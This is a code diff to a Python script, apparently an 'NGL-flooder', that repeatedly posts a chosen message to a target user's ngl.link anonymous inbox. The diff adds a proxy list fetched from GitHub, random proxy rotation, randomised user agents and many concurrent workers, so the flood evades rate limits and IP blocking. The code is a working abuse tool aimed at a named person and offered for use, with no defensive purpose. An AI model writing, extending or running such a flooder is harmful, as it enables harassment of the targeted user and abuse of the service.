@@ -29,7 +29,18 @@ def user_agents():
         print(f"Error downloading user agents: {e}")
         return []
 
-async def send_message(client, target, message, agents, delay=0):
+def get_https_proxies():
+    try:
+        url = "https://raw.githubusercontent.com/4levy/NGL-flooder/refs/heads/main/proxies_checked.txt"
+        response = requests.get(url)
+        response.raise_for_status()
+        proxies = [line.strip() for line in response.text.splitlines() if line.strip()]
+        return proxies
+    except requests.exceptions.RequestException as e:
+        print(f"Error downloading proxies: {e}")
+        return []
+
+async def send_message(client, target, message, agents, proxies, delay=0):
     user_agent = random.choice(agents)
     headers = {
         "User-Agent": user_agent,
@@ -42,9 +53,18 @@ async def send_message(client, target, message, agents, delay=0):
         "gameSlug": None,
         "referrer": None
     }
+    proxy = None
+    if proxies:
+        proxy = random.choice(proxies)
+        proxy_url = f"http://{proxy}"
     while True:
         try:
-            response = await client.post("https://ngl.link/api/submit", headers=headers, data=payload)
+            if proxy:
+                transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
+                async with httpx.AsyncClient(transport=transport) as proxy_client:
+                    response = await proxy_client.post("https://ngl.link/api/submit", headers=headers, data=payload)
+            else:
+                response = await client.post("https://ngl.link/api/submit", headers=headers, data=payload)
             if response.status_code == 200:
                 print(f"[+] Sent! - {response.status_code}")
                 break
@@ -70,18 +90,37 @@ def feliy():
     if not agents:
         print("Failed to load user agents. Exiting.")
         return
+    proxies = get_https_proxies()
+    if not proxies:
+        print("Failed to load HTTPS proxies. Continuing without proxies.")
 
     print(BANNER)
     print(f"\nLoaded {len(agents)} user agents\n")
+    print(f"Loaded {len(proxies)} HTTPS proxies\n")
 
     t = input("Username target: ")
     m = input("Message: ")
-    delay = float(input("Delay between requests (seconds): "))
+    while True:
+        delay_input = input("Delay between requests (seconds): ").strip()
+        try:
+            delay = float(delay_input.lstrip('0') or '0')
+            break
+        except ValueError:
+            print("Invalid delay. Please enter a valid number (e.g., 2 or 0.5).")
+    while True:
+        workers_input = input("Number of concurrent workers (e.g., 10): ").strip()
+        try:
+            workers = int(workers_input.lstrip('0') or '1')
+            if workers < 1:
+                raise ValueError
+            break
+        except ValueError:
+            print("Invalid number. Please enter a positive integer.")
 
     async def inm():
         async with httpx.AsyncClient() as client:
-            while True:
-                await send_message(client, t, m, agents, delay)
+            tasks = [asyncio.create_task(send_message(client, t, m, agents, proxies, delay)) for _ in range(workers)]
+            await asyncio.gather(*tasks)
 
     try:
         asyncio.run(inm())
